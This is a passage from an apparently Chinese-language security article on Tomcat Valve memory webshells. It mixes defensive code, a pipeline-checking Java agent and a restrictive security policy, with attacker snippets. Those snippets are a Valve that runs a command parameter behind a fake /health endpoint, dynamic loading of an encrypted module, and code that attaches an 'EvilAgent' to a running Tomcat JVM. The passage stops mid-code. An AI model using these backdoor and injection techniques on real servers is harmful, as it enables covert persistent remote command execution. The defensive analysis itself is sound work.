</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">premain</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">Instrumentation</span><span class="w"> </span><span class="n">inst</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inst</span><span class="p">.</span><span class="na">addTransformer</span><span class="p">((</span><span class="n">loader</span><span class="p">,</span><span class="w"> </span><span class="n">className</span><span class="p">,</span><span class="w"> </span><span class="n">classBeingRedefined</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">protectionDomain</span><span class="p">,</span><span class="w"> </span><span class="n">classfileBuffer</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">&#34;org/apache/catalina/core/StandardPipeline&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">className</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">patchPipelineClass</span><span class="p">(</span><span class="n">classfileBuffer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">patchPipelineClass</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">original</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 使用ASM添加管道修改检查</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassReader</span><span class="w"> </span><span class="n">cr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ClassReader</span><span class="p">(</span><span class="n">original</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassWriter</span><span class="w"> </span><span class="n">cw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ClassWriter</span><span class="p">(</span><span class="n">cr</span><span class="p">,</span><span class="w"> </span><span class="n">ClassWriter</span><span class="p">.</span><span class="na">COMPUTE_FRAMES</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cr</span><span class="p">.</span><span class="na">accept</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">PipelineCheckAdapter</span><span class="p">(</span><span class="n">cw</span><span class="p">),</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">cw</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p><strong>权限最小化</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 启动脚本添加JVM参数
</span></span><span class="line"><span class="cl">-Djava.security.manager \
</span></span><span class="line"><span class="cl">-Djava.security.policy=tomcat.policy</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>tomcat.policy内容</strong>:</p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-zed" data-lang="zed"><span class="line"><span class="cl"><span class="n">grant</span><span class="w"> </span><span class="n">codeBase</span><span class="w"> </span><span class="err">&#34;</span><span class="n">file</span><span class="o">:</span><span class="err">$</span><span class="p">{</span><span class="n">catalina</span><span class="p">.</span><span class="n">home</span><span class="p">}</span><span class="o">/</span><span class="nn">webapps/yourapp/</span><span class="o">-</span><span class="err">&#34;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 禁止Valve修改权限
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">permission</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">reflect</span><span class="p">.</span><span class="n">ReflectPermission</span><span class="w"> </span><span class="err">&#34;</span><span class="n">suppressAccessChecks</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">permission</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">RuntimePermission</span><span class="w"> </span><span class="err">&#34;</span><span class="n">accessClassInPackage</span><span class="p">.</span><span class="n">org</span><span class="p">.</span><span class="n">apache</span><span class="p">.</span><span class="n">catalina</span><span class="p">.</span><span class="n">core</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
</ol>
<h3 id="五混合注入的演进趋势">五、混合注入的演进趋势<a hidden class="anchor" aria-hidden="true" href="#五混合注入的演进趋势">#</a></h3>
<ol>
<li>
<p><strong>模块化加载</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isTriggerRequest</span><span class="p">(</span><span class="n">request</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 动态加载加密模块</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">encryptedModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fetchModule</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;m&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">module</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">loadModule</span><span class="p">(</span><span class="n">encryptedModule</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">executeModule</span><span class="p">(</span><span class="n">module</span><span class="p">,</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">getNext</span><span class="p">().</span><span class="na">invoke</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p><strong>云环境适配</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6">6</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 检测云环境并调整行为</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isRunningInCloud</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">activateCloudBackdoor</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">activateTraditionalBackdoor</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p><strong>API网关集成</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 伪装成合法的健康检查端点</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">&#34;/health&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getRequestURI</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">action</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;action&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">action</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">executeCommand</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">sendHealthStatus</span><span class="p">(</span><span class="n">response</span><span class="p">);</span><span class="w"> </span><span class="c1">// 返回正常状态</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
</ol>
<h3 id="总结">总结<a hidden class="anchor" aria-hidden="true" href="#总结">#</a></h3>
<p>Tomcat Valve型内存马的混合注入方式代表了当前高级威胁的典型手法：</p>
<ol>
<li><strong>API与反射的精准结合</strong>- 在保持隐蔽性的同时提高可靠性</li>
<li><strong>上下文感知的攻击逻辑</strong>- 基于环境动态调整行为</li>
<li><strong>多层防御规避</strong>- 从类加载到管道操作全面伪装</li>
</ol>
<h2 id="agent--asmjavassist-字节码注入">Agent + ASM/Javassist 字节码注入<a hidden class="anchor" aria-hidden="true" href="#agent--asmjavassist-字节码注入">#</a></h2>
<h3 id="一攻击流程详解">一、攻击流程详解<a hidden class="anchor" aria-hidden="true" href="#一攻击流程详解">#</a></h3>
<p><strong>阶段1：Agent注入（JVM渗透）</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 获取目标Tomcat进程PID</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">List</span><span class="o">&lt;</span><span class="n">VirtualMachineDescriptor</span><span class="o">&gt;</span><span class="w"> </span><span class="n">vms</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualMachine</span><span class="p">.</span><span class="na">list</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">VirtualMachineDescriptor</span><span class="w"> </span><span class="n">vmd</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">vms</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">vmd</span><span class="p">.</span><span class="na">displayName</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;catalina&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vmd</span><span class="p">.</span><span class="na">id</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 动态加载Agent</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">VirtualMachine</span><span class="w"> </span><span class="n">vm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualMachine</span><span class="p">.</span><span class="na">attach</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">vm</span><span class="p">.</span><span class="na">loadAgent</span><span class="p">(</span><span class="s">&#34;/path/to/agent.jar&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;injection_params&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">vm</span><span class="p">.</span><span class="na">detach</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>阶段2：Agent核心逻辑</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EvilAgent</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">premain</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">Instrumentation</span><span class="w"> </span><span class="n">inst</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inst</span><span class="p">.</span><span class="na">addTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">CriticalClassTransformer</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CriticalClassTransformer</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">ClassFileTransformer</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Set</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">TARGET_CLASSES</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Set</span><span class="p">.</span><span class="na">of</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;org.apache.catalina.core.StandardPipeline&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;org.apache.catalina.core.StandardContextValve&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;org.apache.catalina.valves.AccessLogValve&#34;</span><span class="w">
